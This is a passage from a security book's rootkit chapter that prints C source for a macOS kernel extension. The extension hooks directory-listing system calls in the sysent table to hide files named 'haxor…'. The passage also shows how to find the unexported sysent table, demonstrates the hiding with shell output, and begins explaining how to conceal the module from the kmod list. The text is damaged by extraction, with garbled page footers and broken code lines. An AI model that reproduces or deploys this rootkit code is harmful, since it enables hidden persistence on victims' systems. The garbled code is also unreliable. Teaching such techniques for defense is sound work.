#include 
#include 
#include 
#include 
typedef int32_t sy_call_t (struct proc *, void *, int *);
typedef void sy_munge_t (const void *, void *);
struct sysent {
int16_t sy_narg; /* number of arguments */
int8_t reserved; /* unused value */
int8_t sy_flags; /* call flags */
sy_call_t *sy_call; /* implementing function */
sy_munge_t *sy_arg_munge32; /* munge system call arguments for
32-bit processes */
sy_munge_t *sy_arg_munge64; /* munge system call arguments for
64-bit processes */
int32_t sy_return_type; /* return type */
uint16_t sy_arg_bytes; /* The size of all arguments for 32-
bit system calls, in bytes */
};
static struct sysent *_sysent;
extern int nsysent;
#define PAD_(t) (sizeof(uint64_t) bufsize, M_TEMP, M_WAITOK);
copyin(uap->buf, buf, uap->bufsize);
end = buf + uap->bufsize;
9955336633cc1122..iinndddd 333388 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 339
struct direntry *thisEntry = (struct direntry *) buf;
int num_removed = 0;
while(((char *) thisEntry d_reclen > 0)){
char *filename = thisEntry->d_name;
if(!memcmp(filename, “haxor”, 5)){
printf(“[getdirentrie64]: FOUND IT\n”);
int removed_this_time = thisEntry->d_reclen;
char *thisone = (char *) thisEntry;
char *nextone = thisone + thisEntry->d_reclen;
int size_left = uap->bufsize - (thisone - buf);
memmove(thisone, nextone, size_left);
num_removed+=removed_this_time;
end -= removed_this_time;
} else {
char *t = ((char *) thisEntry) + thisEntry->d_reclen;
thisEntry = (struct direntry *) t;
}
}
if(num_removed > 0){
*i -= num_removed;
copyout(buf, uap->buf, uap->bufsize);
}
FREE(buf, M_TEMP);
return ret;
}
Now the getdirentriesattr system call is replaced with our version.
static int our_getdirentriesattr(struct proc *p, struct
getdirentriesattr_args *uap, int *i){
int index;
int ret = real_getdirentriesattr(p, uap, i);
int count;
copyin(uap->count, &count, 4);
char *buffer, *end;
MALLOC(buffer, char *, uap->buffersize, M_TEMP, M_WAITOK);
copyin(uap->buffer, buffer, uap->buffersize);
end = buffer + uap->buffersize;
FInfoAttrBuf *thisEntry = (FInfoAttrBuf *) buffer;
int num_found = 0;
int num_removed = 0;
for (index = 0; index name) + thisEntry-
>name.attr_dataoffset;
9955336633cc1122..iinndddd 333399 11//2255//0099 44::4433::2211 PPMM
340 Part IV ■ Post-Exploitation
printf(“[getdirentriesattr] %s\n”, filename);
if(!memcmp(filename, “haxor”, 5)){
printf(“[getdirentriesattr] FOUND IT\n”);
int removed_this_time = thisEntry->length;
char *thisone = (char *) thisEntry;
char *nextone = thisone + thisEntry->length;
int size_left = uap->buffersize - (thisone - buffer);
memmove(thisone, nextone, size_left);
num_found++;
num_removed+=removed_this_time;
} else {
char *t = ((char *) thisEntry) + thisEntry->length;
thisEntry = (FInfoAttrBuf *) t;
}
}
if(num_found > 0){
count -= num_found;
copyout(&count, uap->count, 4);
uap->buffersize -= num_removed;
copyout(buffer, uap->buffer, uap->buffersize);
}
FREE(buffer, M_TEMP);
return ret;
}
The following function is responsible for fi nding the sysent table’s address.
This is necessary since the kernel does not export the sysent symbol.
#define is_small(x) (*(x)>=0 && *(x)10000)
#define is_optional_addy(x) (*(x)==0 || *(x)>10000)
#define is_stuct_sysent(x) ( is_small(x) && is_addy((x)+1) &&
is_optional_addy((x)+2) && is_optional_addy((x)+3) && is_small((x)+4)
&& is_small((x)+5) )
#define is_sysent(x) (is_stuct_sysent((x)) &&
is_stuct_sysent((x+6)) && is_stuct_sysent((x+12)))
static struct sysent *find_sysent () {
unsigned int *looker = (unsigned int *) ( ((char *) &nsysent) +
sizeof(nsysent) );
while(!is_sysent(looker)){
looker++;
}
printf(“Found sysent table at %x\n”, looker);
return (struct sysent *) looker;
}
9955336633cc1122..iinndddd 334400 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 341
Finally, the followed code is executed when the kext is loaded. It is responsible
for doing the actual system-call hooking.
kern_return_t hidefile_start (kmod_info_t *ki, void *d) {
_sysent = find_sysent();
if (_sysent == NULL) {
return KERN_FAILURE;
}
real_getdirentriesattr = (getdirentriesattr_t *)
_sysent[SYS_getdirentriesattr].sy_call;
_sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)
our_getdirentriesattr;
real_getdirentries64 = (getdirentries64_t *)
_sysent[SYS_getdirentries64].sy_call;
_sysent[SYS_getdirentries64].sy_call = (sy_call_t *)
our_getdirentries64;
printf(“[hidefile] Patching system calls\n”);
return KERN_SUCCESS;
kern_return_t hidefile_stop (kmod_info_t * ki, void * d) {
_sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)
real_getdirentriesattr;
_sysent[SYS_getdirentries64].sy_call = (sy_call_t *)
real_getdirentries64;
printf(“[hidefile] Unpatching system calls\n”);
return KERN_SUCCESS;
}
This code begins by declaring the various structures and variables the code
needs. There are the two hooking functions: our_getdirentriesattr and our_get-
direntries64. The most important part occurs in the hidefi le_start function. This
locates the sysent table and actually hooks the two system-call functions. Be
sure to unhook the sysent table when you unload the kernel module.
Keep in mind that bugs in regular programs crash the program, but bugs
in kernel code crash the kernel—i.e., the whole system. Unfortunately, debug-
ging kernel code often involves a large number of reboots. Take a look at this
rootkit in action.
$ ls
Writing A Template, Sample, Instructions macosx-book
fuzzing-book testfile.txt
haxortime.txt
$ sudo kextload /tmp/pt_deny_attach.kext
kextload: /tmp/pt_deny_attach.kext loaded successfully
9955336633cc1122..iinndddd 334411 11//2255//0099 44::4433::2211 PPMM
342 Part IV ■ Post-Exploitation
$ ls
Writing A Template, Sample, Instructions macosx-book
fuzzing-book testfile.txt
The haxortime.txt fi le is now hidden! Notice, though, it is still not completely
undetectable.
$ ls h*
haxortime.txt
Here the bash shell expands the asterisk (*) to fi nd the hidden fi le. Breaking
out DTrace reveals that it uses yet another system call, this time getdirentries.
$ sudo dtrace -s finder-finder.d
dtrace: script ‘finder-finder.d’ matched 427 probes
CPU ID FUNCTION:NAME
0 17598 read:entry
0 17598 read:entry
0 18386 write_nocancel:entry
0 17698 sigaltstack:entry
0 17598 read:entry
1 17688 sigprocmask:entry
0 18386 write_nocancel:entry
0 17684 sigaction:entry
0 17684 sigaction:entry
0 18388 open_nocancel:entry
0 18404 fcntl_nocancel:entry
0 17908 fstatfs:entry
0 17984 getdirentries:entry
…
You may experiment with hiding from this system call.
Hiding the Rootkit
The previous section demonstrated a fi le-hiding kernel module. This module
made no effort to hide itself from the victim, however.
$ kextstat
Index Refs Address Size Wired Name (Version) 
1 2 0x0 0x0 0x0 com.apple.kernel (9.4.0)
…
143 0 0x341d0000 0x2000 0x1000 book.macosx.kext.hidefile
(2.0) 
Not exactly stealthy. The previous section demonstrated that by observing
the system calls used by kextstat, system-call hooking techniques could be used
to hide the module. Although the kernel still could “see” the fi le, the rootkit
9955336633cc1122..iinndddd 334422 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 343
changed the answers the kernel gave to applications through system calls. In
this section, instead of changing what the kernel says, the extension will actu-
ally change the kernel’s view of things.
Once the kernel extension is running within the kernel, all of the data struc-
tures the kernel uses are available. As seen with the sysent table, they may not
all be directly accessible in source code, but if the kext can fi nd them, it can
manipulate them.
First we need to digress a bit and talk about the way the kernel organizes
and manages the kernel extensions that are loaded. The information about
each loaded kernel module is stored as a struct kmod_info; see osfmk/mach/
kmod.h in the kernel source.
typedef struct kmod_info {
struct kmod_info *next;
int info_version; // version of
this structure
int id;
char name[KMOD_MAX_NAME];
char version[KMOD_MAX_NAME];
int reference_count; // # refs to
this
kmod_reference_t *reference_list; // who this refs
vm_address_t address; // starting
address
vm_size_t size; // total size
vm_size_t hdr_size; // unwired hdr
size
kmod_start_func_t *start;
kmod_stop_func_t *stop;
} kmod_info_t;
All of the modules are stored in a linked list, and a pointer called kmod points
to the head of the linked list. The last module in the list has the next pointer set
to zero. The following function from the kernel shows how to iterate through
the list of kernel-module information (from osfmk/kern/kmod.c).
kmod_info_t *
kmod_lookupbyname(const char * name)
{
kmod_info_t *k = NULL;
k = kmod;
while (k) {
if (!strncmp(k->name, name, sizeof(k->name)))
break;
k = k->next;
}
return k;
}
9955336633cc1122..iinndddd 334433 11//2255//0099 44::4433::2211 PPMM
344 Part IV ■ Post-Exploitation
To hide the rootkit, it simply needs to be removed from this linked list. In
this way, when the kernel iterates through the list looking for all the modules,
it will never encounter the hidden one, although the code will still be resident
in the kernel. Another byproduct of this, which can be considered either good